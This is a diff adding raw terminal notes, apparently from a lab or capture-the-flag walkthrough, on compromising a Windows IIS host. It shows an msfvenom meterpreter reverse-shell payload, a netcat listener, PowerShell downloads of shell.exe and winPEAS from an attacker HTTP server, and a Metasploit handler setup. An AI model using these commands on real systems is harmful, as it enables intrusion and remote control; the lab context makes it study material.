@@ -343,4 +343,81 @@ Here a more stable reverse shell is the goal that from the exploit so a msfvenom
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=[YOUR_IP] LPORT=4444 -f exe > shell.exe
 
+root@ip-10-145-67-108:~# nc -lp 4445
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
 
+c:\windows\system32\inetsrv>
+cd c:\windows\temp
+c:\Windows\Temp>
+powershell -c "Invoke-WebRequest -Uri 'http://10.145.67.108:8000/shell.exe' -Outfile 'c:\windows\temp\shell.exe'
+dir shell.*
+c:\Windows\Temp>dir shell.*
+ Volume in drive C has no label.
+ Volume Serial Number is 0E97-C552
+ Directory of c:\Windows\Temp
+04/19/2026  12:41 PM            73,802 shell.exe
+               1 File(s)         73,802 bytes
+               0 Dir(s)  38,981,611,520 bytes free
+
+msf6 > use exploit multihandler
+[-] No results from search
+[-] Failed to load module: exploit
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > show options 
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current   Required  Descriptio
+          Setting             n
+   ----   --------  --------  ----------
+   LHOST            yes       The listen
+                               address (
+                              an interfa
+                              ce may be
+                              specified)
+   LPORT  4444      yes       The listen
+                               port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/handler) > set LHOST 10.145.67.108
+LHOST => 10.145.67.108
+msf6 exploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 10.145.67.108:4444 
+
+
+root@ip-10-145-67-108:/opt/PEAS/winPEAS/winPEASbat# python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+powershell -c "Invoke-WebRequest -Uri 'http://10.145.67.108:8000/shell.exe' -Outfile 'c:\windows\temp\winPEAS.bat'
+
+root@ip-10-145-67-108:~# python3 -m http.server 6000
+Serving HTTP on 0.0.0.0 port 6000 (http://0.0.0.0:6000/) ...
+10.145.143.177 - - [19/Apr/2026 21:05:43] "GET /shell.exe HTTP/1.1" 200 -
+
+
+powershell -c "Invoke-WebRequest -Uri 'http://10.145.67.108:7000/shell.exe' -Outfile 'c:\windows\temp\winPEAS.bat'
+
+root@ip-10-145-67-108:/opt/PEAS/winPEAS/winPEASbat# python3 -m http.server 7000
+Serving HTTP on 0.0.0.0 port 7000 (http://0.0.0.0:7000/) ...
+10.145.143.177 - - [19/Apr/2026 21:11:30] code 404, message File not found
+10.145.143.177 - - [19/Apr/2026 21:11:30] "GET /shell.exe HTTP/1.1" 404 -
+10.145.143.177 - - [19/Apr/2026 21:13:24] "GET /winPEAS.bat HTTP/1.1" 200 -
+
+c:\Windows\Temp>powershell -c "Invoke-WebRequest -Uri 'http://10.145.67.108:7000/winPEAS.bat' -Outfile 'c:\windows\temp\winPEAS.bat'
+powershell -c "Invoke-WebRequest -Uri 'http://10.145.67.108:7000/winPEAS.bat' -Outfile 'c:\windows\temp\winPEAS.bat'
+
+c:\Windows\Temp>
